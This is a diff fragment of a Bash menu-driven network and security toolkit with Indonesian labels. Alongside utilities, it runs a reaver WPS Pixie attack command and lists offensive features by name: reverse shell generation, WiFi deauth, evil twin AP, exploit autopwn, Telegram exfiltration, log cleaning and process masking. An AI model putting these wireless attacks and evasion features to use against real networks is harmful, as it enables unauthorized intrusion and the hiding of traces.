+
+  sudo reaver -i "$iface" -b "$bssid" -K 1 -vv | tee "$outfile"
+
+  echo -e "${GREEN}[✔] Output saved: $outfile${NC}"
+  log "WIFI: WPS Pixie completed for $bssid"
+}
+
+cmd_bluetooth_scan() {
+  if ! command -v bluetoothctl >/dev/null 2>&1; then
+    echo -e "${RED}[X] bluetoothctl not found. Install: sudo apt install bluez${NC}"
+    return 1
+  fi
+
+  local timestamp=$(date +%Y%m%d_%H%M%S)
+  local outfile="$RESULTS_DIR/bt_scan_${timestamp}.txt"
+  mkdir -p "$RESULTS_DIR"
+
+  log "WIFI: Bluetooth scan started"
+  echo -e "${YELLOW}[~] Scanning Bluetooth for 15s...${NC}"
+
+  sudo timeout 15 bluetoothctl --timeout 15 scan on | tee "$outfile"
+
+  echo -e "${GREEN}[✔] Saved: $outfile${NC}"
+  log "WIFI: Bluetooth scan saved to $outfile"
+}
+
+# =========================
+# ⚙️ BACKGROUND INSTALL (SAFE)
+# =========================
+
+background_install() {
+  for pkg in nmap dialog figlet; do
+    if ! command -v "$pkg" >/dev/null 2>&1; then
+      echo "[~] Installing $pkg (background)..."
+      (
+        sudo apt update -y >/dev/null 2>&1
+        sudo apt install -y "$pkg" >/dev/null 2>&1
+      ) &
+    fi
+  done
+}
+
+# =========================
+# 🔁 MAIN LOOP
+# =========================
+
+cleanup_child
+
+if [ "$1" = "--run-scenario" ]; then
+  if [ -z "$2" ]; then
+    echo "[!] Scenario file kosong"
+    exit 1
+  fi
+
+  run_scenario_file "$2"
+  exit $?
+fi
+
+background_install
+
+while true; do
+
+  write_heartbeat "MENU"
+
+  if [ "$RETURN_TO_MAIN" -eq 1 ]; then
+    reset_state
+    clear
+    continue
+  fi
+
+  if [ "$RECOVERY_MODE" -eq 1 ]; then
+    reset_state
+    clear
+    continue
+  fi
+
+  if [ "$CRASH_FLAG" -eq 1 ]; then
+    CRASH_FLAG=0
+  fi
+
+  if [ "$INTERRUPTED" -eq 1 ]; then
+    INTERRUPTED=0
+    continue
+  fi
+
+  # =========================
+  # 🔧 BUILD MAIN MENU
+  # =========================
+
+  main_items=()
+  main_actions=()
+
+  main_items+=("IP Tools");      main_actions+=("menu_ip")
+  main_items+=("TCP Tools");     main_actions+=("menu_tcp")
+  main_items+=("Storage Mode");  main_actions+=("menu_storage")
+
+  HAS_AI=0
+  [ "$AI_DETECT_FLAG" -eq 1 ] && HAS_AI=1
+  [ "$AI_TRAIN_FLAG"  -eq 1 ] && HAS_AI=1
+  [ "$AI_CHAT_FLAG"   -eq 1 ] && HAS_AI=1
+
+  [ "$HAS_AI"        -eq 1 ] && main_items+=("AI Tools")       && main_actions+=("menu_ai")
+  [ "$SCENARIO_FLAG" -eq 1 ] && main_items+=("Custom Scenario") && main_actions+=("menu_scenario")
+  [ "$OFFENSIVE_FLAG" -eq 1 ] && main_items+=("Offensive Tools") && main_actions+=("menu_offensive")
+  [ "$NEXUS_FLAG" -eq 1 ] && main_items+=("Nexus") && main_actions+=("menu_nexus")
+
+  main_items+=("Exit"); main_actions+=("do_exit")
+
+  # =========================
+  # TAMPILKAN MAIN MENU
+  # =========================
+
+  echo -e "${CYAN}=========================${NC}"
+  echo ""
+  echo -e "${CYAN}"
+  echo "   ██████╗███████╗███╗   ███╗██████╗ ██╗   ██╗███╗   ██╗ ██████╗ "
+  echo "  ██╔════╝██╔════╝████╗ ████║██╔══██╗██║   ██║████╗  ██║██╔════╝ "
+  echo "  ██║     █████╗  ██╔████╔██║██████╔╝██║   ██║██╔██╗ ██║██║  ███╗"
+  echo "  ██║     ██╔══╝  ██║╚██╔╝██║██╔══██╗██║   ██║██║╚██╗██║██║   ██║"
+  echo "  ╚██████╗███████╗██║ ╚═╝ ██║██████╔╝╚██████╔╝██║ ╚████║╚██████╔╝"
+  echo "   ╚═════╝╚══════╝╚═╝     ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ "
+  echo -e "${NC}"
+  echo ""
+  echo -e "${CYAN}=========================${NC}"
+  echo -e "${YELLOW}Storage Mode : $storage_mode${NC}"
+  echo -e "${BLUE}Path         : $storage_path${NC}"
+  echo -e "${CYAN}=========================${NC}"
+
+  for i in "${!main_items[@]}"; do
+    echo "$((i+1)). ${main_items[$i]}"
+  done
+
+  echo -e "${CYAN}=========================${NC}"
+
+  IFS= read -r -p "Pilih menu: " main || continue
+
+  if ! [[ "$main" =~ ^[0-9]+$ ]]; then
+    echo -e "${RED}Invalid option${NC}"
+    continue
+  fi
+
+  action="${main_actions[$((main-1))]}"
+
+  if [ -z "$action" ]; then
+    echo -e "${RED}Invalid option${NC}"
+    continue
+  fi
+
+  case "$action" in
+
+    # =====================
+    # 🌐 IP TOOLS
+    # =====================
+    menu_ip)
+      while true; do
+
+        if [ "$RETURN_TO_MAIN" -eq 1 ]; then
+          break
+        fi
+
+        echo -e "${CYAN}=========================${NC}"
+	echo -e "${GREEN}        IP TOOLS${NC}"
+	echo -e "${CYAN}=========================${NC}"
+	echo "1. Network Utilities"
+	echo "2. Network Monitor"
+	echo "3. Network Control"
+	echo "4. Kembali"
+	echo -e "${CYAN}=========================${NC}"
+
+        IFS= read -r -p "Pilih menu: " ipmenu || continue
+
+        case $ipmenu in
+  	  1)
+    	    while true; do
+      	      if [ "$RETURN_TO_MAIN" -eq 1 ]; then break; fi
+              echo -e "${CYAN}=========================${NC}"
+              echo -e "${GREEN}   NETWORK UTILITIES${NC}"
+              echo -e "${CYAN}=========================${NC}"
+              echo "1.  Lihat IP"
+              echo "2.  Scan Jaringan"
+              echo "3.  Ping IP"
+              echo "4.  Set IP Manual"
+              echo "5.  Routing"
+              echo "6.  DNS Check"
+              echo "7.  Internet Check"
+              echo "8.  Scan SSH Device"
+              echo "9.  SSH Connect"
+              echo "10. Reset IP"
+              echo "11. Kembali"
+              echo -e "${CYAN}=========================${NC}"
+              IFS= read -r -p "Pilih menu: " netmenu || continue
+              case $netmenu in
+                1)  cmd_lihat_ip;      log_save "Lihat IP" ;;
+                2)  cmd_scan_jaringan; log_save "Scan jaringan" ;;
+                3)  cmd_ping_ip;       log_save "Ping IP" ;;
+                4)  cmd_set_ip_manual; log_save "Set IP manual" ;;
+                5)  cmd_routing ;;
+                6)  cmd_dns_check ;;
+                7)  cmd_internet_check ;;
+                8)  cmd_scan_ssh ;;
+                9)  cmd_ssh_connect ;;
+                10) cmd_reset_ip;      log_save "Reset IP DHCP" ;;
+                11) break ;;
+              esac
+            done
+            ;;
+
+          2)
+            while true; do
+              if [ "$RETURN_TO_MAIN" -eq 1 ]; then break; fi
+              echo -e "${CYAN}=========================${NC}"
+              echo -e "${GREEN}   NETWORK MONITOR${NC}"
+              echo -e "${CYAN}=========================${NC}"
+              echo "1. ARP Watch"
+              echo "2. Connection Monitor"
+              echo "3. DHCP Snooping"
+              echo "4. Kembali"
+              echo -e "${CYAN}=========================${NC}"
+              IFS= read -r -p "Pilih menu: " monmenu || continue
+              case $monmenu in
+                1) cmd_arp_watch;     log_save "ARP Watch" ;;
+                2) cmd_conn_monitor;  log_save "Connection Monitor" ;;
+                3) cmd_dhcp_snooping; log_save "DHCP Snooping" ;;
+                4) break ;;
+              esac
+            done
+            ;;
+
+          3)
+            while true; do
+              if [ "$RETURN_TO_MAIN" -eq 1 ]; then break; fi
+              echo -e "${CYAN}=========================${NC}"
+              echo -e "${GREEN}   NETWORK CONTROL${NC}"
+              echo -e "${CYAN}=========================${NC}"
+              echo "1. IP Blocklist"
+              echo "2. MAC Whitelist"
+              echo "3. Kembali"
+              echo -e "${CYAN}=========================${NC}"
+              IFS= read -r -p "Pilih menu: " ctrlmenu || continue
+              case $ctrlmenu in
+                1) cmd_ip_blocklist;  log_save "IP Blocklist" ;;
+                2) cmd_mac_whitelist; log_save "MAC Whitelist" ;;
+                3) break ;;
+              esac
+            done
+            ;;
+
+          4) break ;;
+        esac
+
+      done
+      ;;
+
+    # =====================
+    # 🔥 TCP TOOLS
+    # =====================
+    menu_tcp)
+      while true; do
+
+        if [ "$RETURN_TO_MAIN" -eq 1 ]; then
+          break
+        fi
+
+        echo -e "${CYAN}=========================${NC}"
+	echo -e "${GREEN}        TCP TOOLS${NC}"
+	echo -e "${CYAN}=========================${NC}"
+	echo "1. Port Scanner"
+	echo "2. TCP Defensive"
+	echo "3. Kembali"
+	echo -e "${CYAN}=========================${NC}"
+
+        IFS= read -r -p "Pilih menu: " tcpmenu || continue
+
+        case $tcpmenu in
+          1)
+            while true; do
+              if [ "$RETURN_TO_MAIN" -eq 1 ]; then break; fi
+              echo -e "${CYAN}=========================${NC}"
+              echo -e "${GREEN}     PORT SCANNER${NC}"
+              echo -e "${CYAN}=========================${NC}"
+              echo "1. Scan Port"
+              echo "2. Service Detection"
+              echo "3. Range Scan"
+              echo "4. Specific Port"
+              echo "5. Local Ports"
+              echo "6. Banner Grab"
+              echo "7. Kembali"
+              echo -e "${CYAN}=========================${NC}"
+              IFS= read -r -p "Pilih menu: " scanmenu || continue
+              case $scanmenu in
+                1) cmd_tcp_scan_port ;;
+                2) cmd_tcp_service_detection ;;
+                3) cmd_tcp_range_scan ;;
+                4) cmd_tcp_specific_port ;;
+                5) cmd_tcp_local_ports ;;
+                6) cmd_tcp_banner_grab ;;
+                7) break ;;
+              esac
+            done
+            ;;
+
+          2)
+            while true; do
+              if [ "$RETURN_TO_MAIN" -eq 1 ]; then break; fi
+              echo -e "${CYAN}=========================${NC}"
+              echo -e "${GREEN}    TCP DEFENSIVE${NC}"
+              echo -e "${CYAN}=========================${NC}"
+              echo "1. Port Knocking Setup"
+              echo "2. Fail2Ban Monitor"
+              echo "3. SYN Flood Detector"
+              echo "4. Kembali"
+              echo -e "${CYAN}=========================${NC}"
+              IFS= read -r -p "Pilih menu: " defmenu || continue
+              case $defmenu in
+                1) cmd_port_knock_setup;  log_save "Port Knock Setup" ;;
+                2) cmd_fail2ban_status;   log_save "Fail2Ban Status" ;;
+                3) cmd_syn_flood_detect;  log_save "SYN Flood Detect" ;;
+                4) break ;;
+              esac
+            done
+            ;;
+
+          3) break ;;
+        esac
+
+      done
+      ;;
+
+    # =====================
+    # 💾 STORAGE MODE
+    # =====================
+    menu_storage)
+      while true; do
+
+        if [ "$RETURN_TO_MAIN" -eq 1 ]; then
+          break
+        fi
+
+        echo -e "${CYAN}=========================${NC}"
+        echo -e "${YELLOW}     STORAGE MODE${NC}"
+        echo -e "${CYAN}=========================${NC}"
+        echo "1. Local Mode"
+        echo "2. USB Mode"
+        echo "3. Installer"
+        echo "4. Save Log"
+        echo "5. USB Tools"
+        echo "6. Security"
+        echo "7. Reporting"
+        echo "8. Kembali"
+        echo -e "${CYAN}=========================${NC}"
+
+        IFS= read -r -p "Pilih menu: " smode || continue
+
+        case $smode in
+          1) cmd_storage_local ;;
+          2) cmd_storage_usb ;;
+          3) cmd_storage_install ;;
+          4) cmd_storage_save_log ;;
+
+          5)
+            if [ "$INTERRUPTED" -eq 1 ]; then
+               INTERRUPTED=0
+               break
+            fi
+
+            while true; do
+
+              if [ "$RETURN_TO_MAIN" -eq 1 ]; then
+                 break
+              fi
+
+              echo -e "${CYAN}=========================${NC}"
+              echo -e "${GREEN}      USB TOOLS${NC}"
+              echo -e "${CYAN}=========================${NC}"
+              echo "1. Detect USB"
+              echo "2. Select USB"
+              echo "3. Create Workspace"
+              echo "4. Read Data"
+              echo "5. Delete Data"
+              echo "6. Kembali"
+              echo -e "${CYAN}=========================${NC}"
+
+              IFS= read -r -p "Pilih menu: " usbmenu || continue
+
+              case $usbmenu in
+                1) cmd_usb_detect ;;
+                2) cmd_usb_select ;;
+                3) cmd_usb_workspace ;;
+                4) cmd_usb_read ;;
+                5) cmd_usb_delete ;;
+                6) break ;;
+              esac
+
+            done
+            ;;
+           
+          6)
+            while true; do
+              if [ "$RETURN_TO_MAIN" -eq 1 ]; then break; fi
+                echo -e "${CYAN}=========================${NC}"
+                echo -e "${GREEN}       SECURITY${NC}"
+                echo -e "${CYAN}=========================${NC}"
+                echo "1. Log Integrity Check"
+                echo "2. File Monitor"
+                echo "3. Kembali"
+                echo -e "${CYAN}=========================${NC}"
+                IFS= read -r -p "Pilih menu: " secmenu || continue
+                case $secmenu in
+                  1) cmd_log_integrity_check; log_save "Log Integrity Check" ;;
+                  2) cmd_file_monitor;        log_save "File Monitor" ;;
+                  3) break ;;
+                esac
+              done
+              ;;
+
+          7)
+            while true; do
+              if [ "$RETURN_TO_MAIN" -eq 1 ]; then break; fi
+                echo -e "${CYAN}=========================${NC}"
+                echo -e "${GREEN}      REPORTING${NC}"
+                echo -e "${CYAN}=========================${NC}"
+                echo "1. Auto Report"
+                echo "2. Telegram Exfil"
+                echo "3. Scan Scheduler"
+                echo "4. Kembali"
+                echo -e "${CYAN}=========================${NC}"
+                IFS= read -r -p "Pilih menu: " repomenu || continue
+                case $repomenu in
+                  1) cmd_auto_report; log_save "Auto Report" ;;
+                  2) cmd_telegram_exfil; log_save "Telegram Exfil" ;;
+                  3) cmd_scan_scheduler; log_save "Scan Scheduler" ;;
+                  4) break ;;
+                esac
+              done
+              ;;
+
+            8) break ;; 
+
+          esac
+
+        done
+        ;;
+
+    # =====================
+    # 🤖 AI TOOLS
+    # =====================
+    menu_ai)
+      while true; do
+
+        if [ "$RETURN_TO_MAIN" -eq 1 ]; then
+          break
+        fi
+
+        # build AI submenu dinamis
+        ai_items=()
+        ai_actions=()
+
+        [ "$AI_DETECT_FLAG" -eq 1 ] && ai_items+=("Detect Webcam (All)")    && ai_actions+=("cmd_ai_webcam_all")
+        [ "$AI_DETECT_FLAG" -eq 1 ] && ai_items+=("Detect Webcam (Person)") && ai_actions+=("cmd_ai_webcam_person")
+        [ "$AI_DETECT_FLAG" -eq 1 ] && ai_items+=("Detect CCTV (RTSP)")     && ai_actions+=("cmd_ai_rtsp")
+        [ "$AI_DETECT_FLAG" -eq 1 ] && ai_items+=("Detect Image File")      && ai_actions+=("cmd_ai_image")
+        [ "$AI_DETECT_FLAG" -eq 1 ] && ai_items+=("Detect Video File")      && ai_actions+=("cmd_ai_video")
+        [ "$AI_TRAIN_FLAG"  -eq 1 ] && ai_items+=("Custom AI Train")        && ai_actions+=("cmd_ai_train")
+        [ "$AI_DETECT_FLAG" -eq 1 ] && ai_items+=("Custom AI Run")          && ai_actions+=("cmd_ai_run")
+        [ "$AI_CHAT_FLAG"   -eq 1 ] && ai_items+=("AI Chat")                && ai_actions+=("menu_ai_chat")
+
+        echo -e "${CYAN}=========================${NC}"
+        echo -e "${GREEN}        AI TOOLS${NC}"
+        echo -e "${CYAN}=========================${NC}"
+
+        for i in "${!ai_items[@]}"; do
+          echo "$((i+1)). ${ai_items[$i]}"
+        done
+
+        echo "$((${#ai_items[@]}+1)). Kembali"
+        echo -e "${CYAN}=========================${NC}"
+
+        IFS= read -r -p "Pilih menu: " aimenu || continue
+
+        if ! [[ "$aimenu" =~ ^[0-9]+$ ]]; then
+          echo -e "${RED}Invalid option${NC}"
+          continue
+        fi
+
+        if [ "$aimenu" -eq "$((${#ai_items[@]}+1))" ]; then
+          break
+        fi
+
+        ai_action="${ai_actions[$((aimenu-1))]}"
+
+        if [ -z "$ai_action" ]; then
+          echo -e "${RED}Invalid option${NC}"
+          continue
+        fi
+
+        case "$ai_action" in
+
+          cmd_ai_webcam_all)    cmd_ai_webcam_all ;;
+          cmd_ai_webcam_person) cmd_ai_webcam_person ;;
+          cmd_ai_rtsp)          cmd_ai_rtsp ;;
+          cmd_ai_image)         cmd_ai_image ;;
+          cmd_ai_video)         cmd_ai_video ;;
+          cmd_ai_train)         cmd_ai_train ;;
+          cmd_ai_run)           cmd_ai_run ;;
+
+          menu_ai_chat)
+            while true; do
+
+              if [ "$RETURN_TO_MAIN" -eq 1 ]; then
+                break
+              fi
+
+              echo -e "${CYAN}=========================${NC}"
+              echo -e "${GREEN}        AI CHAT${NC}"
+              echo -e "${CYAN}=========================${NC}"
+              echo "1. Start Chat"
+              echo "2. Model Manager"
+              echo "3. AI History"
+              echo "4. AI Status"
+              echo "5. Clear History"
+              echo "6. Kembali"
+              echo -e "${CYAN}=========================${NC}"
+
+              IFS= read -r -p "Pilih menu: " aichat || continue
+
+              case $aichat in
+                1) cmd_ai_chat_start ;;
+
+                2)
+                  while true; do
+
+                    echo "$(date +%s)" > "$WATCHDOG_FILE"
+
+                    if [ "$RETURN_TO_MAIN" -eq 1 ]; then
+                      break
+                    fi
+
+                    echo -e "${CYAN}=========================${NC}"
+                    echo -e "${GREEN}      MODEL MANAGER${NC}"
+                    echo -e "${CYAN}=========================${NC}"
+                    echo "1. Download Model"
+                    echo "2. List Installed Models"
+                    echo "3. Delete Model"
+                    echo "4. Kembali"
+                    echo -e "${CYAN}=========================${NC}"
+
+                    IFS= read -r -p "Pilih menu: " modelmenu || continue
+
+                    case $modelmenu in
+                      1) cmd_ai_download_model ;;
+                      2) cmd_ai_list_models ;;
+                      3) cmd_ai_delete_model ;;
+                      4) break ;;
+                      *) echo -e "${RED}Invalid option${NC}" ;;
+                    esac
+
+                  done
+                  ;;
+
+                3) cmd_ai_history ;;
+                4) cmd_ai_status ;;
+                5) cmd_ai_clear_history ;;
+                6) break ;;
+                *) echo -e "${RED}Invalid option${NC}" ;;
+              esac
+
+            done
+            ;;
+
+        esac
+
+      done
+      ;;
+
+    # =====================
+    # 📦 CUSTOM SCENARIO
+    # =====================
+    menu_scenario)
+      while true; do
+
+        if [ "$RETURN_TO_MAIN" -eq 1 ]; then
+          break
+        fi
+
+        echo -e "${CYAN}=========================${NC}"
+        echo -e "${CYAN}     CUSTOM SCENARIO${NC}"
+        echo -e "${CYAN}=========================${NC}"
+        echo "1. Jalankan Scenario"
+        echo "2. Buat Scenario Baru"
+        echo "3. Kembali"
+        echo -e "${CYAN}=========================${NC}"
+
+        IFS= read -r -p "Pilih menu: " sub || continue
+
+        case $sub in
+
+          1)
+            shopt -s nullglob
+            files=("$SCENARIO_DIR"/*.sh)
+            shopt -u nullglob
+
+            if [ ${#files[@]} -eq 0 ]; then
+              echo "[!] Tidak ada scenario"
+              continue
+            fi
+
+            echo -e "${CYAN}=========================${NC}"
+            echo -e "${CYAN}   DAFTAR SCENARIO${NC}"
+            echo -e "${CYAN}=========================${NC}"
+
+            for i in "${!files[@]}"; do
+              echo "$i. $(basename "${files[$i]}")"
+            done
+
+            echo -e "${CYAN}=========================${NC}"
+
+            read -p "Pilih scenario: " pilih
+
+            if [ -z "$pilih" ]; then
+              echo "[x] Dibatalkan"
+              continue
+            fi
+
+            if ! [[ "$pilih" =~ ^[0-9]+$ ]]; then
+              echo "[!] Pilihan tidak valid"
+              continue
+            fi
+
+            if [ -n "${files[$pilih]}" ]; then
+              echo "[~] Menjalankan scenario..."
+              run_scenario_file "${files[$pilih]}"
+              echo "[✔] Selesai"
+              log_save "Run Scenario $(basename "${files[$pilih]}")"
+            else
+              echo "[!] Pilihan tidak valid"
+            fi
+            ;;
+
+          2)
+            if [ -f "$SCENARIO_BUILDER" ]; then
+              bash "$SCENARIO_BUILDER"
+            else
+              echo "[!] scenario_builder.sh tidak ditemukan"
+            fi
+            ;;
+
+          3) break ;;
+
+        esac
+
+      done
+      ;;
+    
+    # =====================
+    # 💀 OFFENSIVE TOOLS
+    # =====================
+    menu_offensive)
+      echo -e "${RED}=================================${NC}"
+      echo -e "${RED} [!] AUTHORIZED USE ONLY [!]${NC}"
+      echo -e "${RED} [!] ALL ACTIONS LOGGED [!]${NC}"
+      echo -e "${RED}=================================${NC}"
+      sleep 2
+
+      while true; do
+
+        if [ "$RETURN_TO_MAIN" -eq 1 ]; then
+          break
+        fi
+
+        echo -e "${RED}=========================${NC}"
+        echo -e "${RED}   OFFENSIVE TOOLS${NC}"
+        echo -e "${RED}=========================${NC}"
+        echo "1. Offensive Operations"
+        echo "2. OPSEC Tools"
+        echo "3. Wireless Advanced"
+        echo "4. Kembali"
+        echo -e "${RED}=========================${NC}"
+
+        IFS= read -r -p "Pilih menu: " offmode || continue
+
+        case $offmode in
+          1)
+            if [ "$INTERRUPTED" -eq 1 ]; then
+              INTERRUPTED=0
+              break
+            fi
+
+            while true; do
+
+              if [ "$RETURN_TO_MAIN" -eq 1 ]; then
+                break
+              fi
+
+              echo -e "${RED}=========================${NC}"
+              echo -e "${RED} OFFENSIVE OPERATIONS${NC}"
+              echo -e "${RED}=========================${NC}"
+              echo "1. Nmap Vuln Scan"
+              echo "2. Masscan"
+              echo "3. Reverse Shell Generator"
+              echo "4. WiFi Deauth Attack"
+              echo "5. Exploit Autopwn"
+              echo "6. Kembali"
+              echo -e "${RED}=========================${NC}"
+
+              IFS= read -r -p "Pilih menu: " opmenu || continue
+
+              case $opmenu in
+                1) cmd_nmap_vuln_scan; log_save "OFFENSIVE: Nmap Vuln Scan" ;;
+                2) cmd_masscan_aggressive; log_save "OFFENSIVE: Masscan" ;;
+                3) cmd_reverse_shell_gen; log_save "OFFENSIVE: Reverse Shell Gen" ;;
+                4) cmd_wifi_deauth_attack; log_save "OFFENSIVE: WiFi Deauth" ;;
+                5) cmd_exploit_autopwn; log_save "OFFENSIVE: Exploit Autopwn" ;;
+                6) break ;;
+              esac
+
+            done
+            ;;
+
+          2)
+            while true; do
+              if [ "$RETURN_TO_MAIN" -eq 1 ]; then break; fi
+              echo -e "${YELLOW}=========================${NC}"
+              echo -e "${YELLOW}     OPSEC TOOLS${NC}"
+              echo -e "${YELLOW}=========================${NC}"
+              echo "1. MAC Changer"
+              echo "2. Logs Cleaner"
+              echo "3. Torify Session"
+              echo "4. Process Mask"
+              echo "5. Kembali"
+              echo -e "${YELLOW}=========================${NC}"
+              IFS= read -r -p "Pilih menu: " opsecmenu || continue
+              case $opsecmenu in
+                1) cmd_mac_changer; log_save "OPSEC: MAC Changer" ;;
+                2) cmd_logs_cleaner; log_save "OPSEC: Logs Cleaner" ;;
+                3) cmd_torify_session; log_save "OPSEC: Torify Session" ;;
+                4) cmd_proc_mask; log_save "OPSEC: Process Mask" ;;
+                5) break ;;
+              esac
+            done
+            ;;
+
+          3)
+            while true; do
+              if [ "$RETURN_TO_MAIN" -eq 1 ]; then break; fi
+              echo -e "${YELLOW}=========================${NC}"
+              echo -e "${YELLOW}  WIRELESS ADVANCED${NC}"
+              echo -e "${YELLOW}=========================${NC}"
+              echo "1. WiFi PMKID Attack"
+              echo "2. Evil Twin AP"
+              echo "3. WPS Pixie"
+              echo "4. Bluetooth Scan"
+              echo "5. Kembali"
+              echo -e "${YELLOW}=========================${NC}"
+              IFS= read -r -p "Pilih menu: " wlmenu || continue
+              case $wlmenu in
+                1) cmd_wifi_pmkid_attack; log_save "WIRELESS: PMKID Attack" ;;
+                2) cmd_evil_twin_ap; log_save "WIRELESS: Evil Twin AP" ;;
+                3) cmd_wps_pixie; log_save "WIRELESS: WPS Pixie" ;;
+                4) cmd_bluetooth_scan; log_save "WIRELESS: Bluetooth Scan" ;;
+                5) break ;;
+              esac
+            done
+            ;;
+
+          4) break ;;
+
+        esac
+
+      done
+      ;;
+    
+    # =====================
+    # 🔗 NEXUS
+    # =====================
+    menu_nexus)
+      if [ ! -f "$NEXUS_SCRIPT" ]; then
+        print_error "nexus.sh tidak ditemukan"
+        print_info "Jalankan update untuk install NEXUS"
+        sleep 2
+      else
+        source "$NEXUS_SCRIPT"
+        nexus_main
+      fi
+      ;;
+          
+    # =====================
+    # 🚪 EXIT
+    # =====================
+    do_exit)
+      sudo_session_stop
+      echo ""
+      echo -e "${RED}Exiting KECEMBUNG...${NC}"
+
+      pkill -P $$ 2>/dev/null
+
+      sleep 1
+      clear
+      break
+      ;;
+
+  esac
+
+done
